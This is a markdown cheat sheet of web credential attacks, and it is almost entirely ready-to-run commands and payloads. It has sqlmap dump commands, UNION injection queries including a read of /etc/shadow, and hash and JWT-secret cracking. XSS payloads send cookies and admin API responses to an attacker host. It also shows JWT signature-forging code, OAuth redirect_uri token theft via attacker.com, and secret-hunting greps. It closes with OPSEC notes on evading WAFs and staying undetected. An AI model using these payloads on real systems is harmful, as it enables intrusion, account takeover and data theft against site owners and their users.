# Web Application Credential Attacks Reference

## SQL Injection — User/Password Dump

### SQLMap Automated Extraction
```
# Dump user table
sqlmap -u "http://target/page?id=1" --dump -T users -D webapp
sqlmap -u "http://target/page?id=1" --dump -T users -D webapp -C username,password

# Auto-detect and dump passwords
sqlmap -u "http://target/page?id=1" --passwords

# From POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" --dump -T users

# With cookie/session
sqlmap -u "http://target/page?id=1" --cookie="PHPSESSID=abc123" --dump -T users

# Dump all databases
sqlmap -u "http://target/page?id=1" --dump-all --exclude-sysdbs
```

### Manual SQL Injection Queries
```sql
-- MySQL: Extract users
' UNION SELECT username, password FROM users-- -
' UNION SELECT GROUP_CONCAT(username,':',password) FROM users-- -

-- MSSQL
' UNION SELECT name, password_hash FROM sys.sql_logins--

-- PostgreSQL
' UNION SELECT usename, passwd FROM pg_shadow--

-- Oracle
' UNION SELECT username, password FROM dba_users--

-- Read files (MySQL)
' UNION SELECT LOAD_FILE('/etc/shadow'), NULL-- -
```

### Hash Identification and Cracking
```
# Common web password hashes:
# MD5: 32 hex chars → hashcat -m 0
# SHA1: 40 hex chars → hashcat -m 100
# SHA256: 64 hex chars → hashcat -m 1400
# bcrypt: $2a$/$2b$/$2y$ → hashcat -m 3200
# WordPress (phpass): $P$ → hashcat -m 400
# Drupal: $S$ → hashcat -m 7900
# Django PBKDF2: pbkdf2_sha256$ → hashcat -m 10000

hashcat --identify hash.txt    # Auto-detect
```

---

## Session Token Theft

### Cookie Stealing via XSS
```html
<!-- Reflected/Stored XSS payload -->
<script>document.location='http://attacker/steal?c='+document.cookie</script>
<script>new Image().src='http://attacker/steal?c='+document.cookie</script>
<script>fetch('http://attacker/steal',{method:'POST',body:document.cookie})</script>

<!-- For HttpOnly cookies — use XSS to make authenticated requests instead -->
<script>
fetch('/api/admin/users')
.then(r=>r.text())
.then(d=>fetch('http://attacker/exfil',{method:'POST',body:d}))
</script>
```

### Session Fixation
```
# Set session ID before authentication
http://target/login?PHPSESSID=attacker_known_session
# If app doesn't regenerate session ID on login → attacker has valid session
```

### Session Prediction
```
# Collect multiple session tokens and analyze for patterns
# Tools: Burp Sequencer, custom scripts
# Look for: sequential IDs, timestamp-based, weak PRNG
```

---

## JWT (JSON Web Token) Attacks

### JWT Structure
```
# Header.Payload.Signature (base64url encoded)
# Decode: echo -n "eyJ..." | base64 -d
```

### Algorithm Confusion (alg:none)
```python
# Change algorithm to "none" — bypass signature validation
import jwt
token = jwt.encode({"user": "admin"}, key="", algorithm="none")
# Some libraries accept: None, none, NONE, nOnE
```

### Weak Secret Cracking
```
# Hashcat
hashcat -m 16500 jwt_token.txt wordlist.txt
hashcat -m 16500 jwt_token.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# jwt_tool
python3 jwt_tool.py <token> -C -d wordlist.txt

# jwt-cracker (Node.js)
jwt-cracker -t <token> -a -m 6   # Brute force up to 6 chars
```

### RS256 → HS256 Key Confusion
```python
# If server uses RS256 but accepts HS256, sign with public key as HMAC secret
import jwt
public_key = open('public.pem').read()
token = jwt.encode({"user": "admin"}, public_key, algorithm="HS256")
```

### JWT Tool Comprehensive Testing
```
# Enumerate vulnerabilities
python3 jwt_tool.py <token> -M at    # All tests
python3 jwt_tool.py <token> -T       # Tamper mode
python3 jwt_tool.py <token> -I -pc name -pv admin   # Inject claim
```

---

## OAuth Token Attacks

### Authorization Code Theft
```
# Redirect URI manipulation
# Change redirect_uri to attacker-controlled domain
https://auth.target.com/authorize?client_id=APP&redirect_uri=https://attacker.com/callback&response_type=code

# Open redirect chaining
https://auth.target.com/authorize?redirect_uri=https://target.com/redirect?url=https://attacker.com
```

### Token Leakage
```
# Referer header leakage — token in URL fragment
# If target page includes external resources, token leaks via Referer

# Browser history — implicit flow tokens in URL
https://target.com/callback#access_token=eyJ...&token_type=bearer

# Check for tokens in:
# - URL parameters (GET requests)
# - JavaScript variables (view source)
# - Local storage / session storage
# - Postmessage communications
```

### CSRF in OAuth Flow
```
# Missing state parameter → CSRF to link attacker's account
# Intercept callback, replay with victim's session
https://target.com/callback?code=ATTACKER_CODE
# Victim's account now linked to attacker's OAuth identity
```

---

## API Key and Token Extraction

### Common Locations
```
# Client-side JavaScript
grep -roh 'api[_-]?key["\s:=]*["'"'"'][A-Za-z0-9_\-]{20,}' /var/www/
grep -roh 'Bearer [A-Za-z0-9_\-\.]{20,}' /var/www/

# Git repositories
git log --all -p | grep -iE 'password|secret|api_key|token'
trufflehog git file:///path/to/repo

# Environment variables exposed via debug pages
/.env
/debug
/phpinfo.php
/server-status
```

### GraphQL Introspection
```
# May expose internal APIs and authentication details
{"query":"{__schema{types{name,fields{name,type{name}}}}}"}
```

---

## OPSEC Notes
- SQLi extraction may trigger WAF rules — use tamper scripts in sqlmap
- XSS payloads may be logged by CSP report-uri
- JWT cracking is offline and undetectable
- OAuth attacks require user interaction (redirect) — social engineering component
- Always check for HttpOnly, Secure, SameSite flags on cookies before attempting theft
- API key extraction from source code is passive and stealthy
